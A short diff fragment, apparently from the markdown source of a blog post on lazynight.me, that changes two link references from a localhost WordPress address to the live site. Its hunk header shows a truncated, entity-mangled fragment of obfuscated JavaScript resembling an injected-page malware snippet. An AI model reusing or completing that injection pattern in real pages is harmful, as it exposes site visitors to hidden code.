@@ -66,5 +66,5 @@ try{q=document.createElement(&#8220;u&#8221;);q.appendChild(q+&#8221;");}catch(q
 
  [1]: http://lazynight.me/wp-content/uploads/2012/05/ww.gif
  [2]: http://lazynight.me/wp-content/uploads/2012/05/20120523102823.gif
- [3]: http://localhost/wordpress
- [4]: http://localhost/wordpress/2114.html
+ [3]: http://lazynight.me
+ [4]: http://lazynight.me/2114.html
